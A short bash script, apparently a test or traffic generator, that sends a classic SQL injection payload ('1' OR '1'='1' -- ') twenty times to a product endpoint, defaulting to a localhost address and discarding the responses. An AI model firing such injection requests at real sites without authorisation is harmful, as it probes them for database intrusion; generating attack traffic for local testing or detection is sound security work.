#!/usr/bin/env bash
BASE="${1:-http://localhost:3000}"
echo "[SQLI] attacking $BASE"
for i in {1..20}; do
  payload="1' OR '1'='1' -- "
  curl -s "${BASE}/product?id=${payload}" >/dev/null
  sleep 0.2
done
echo "[SQLI] done"
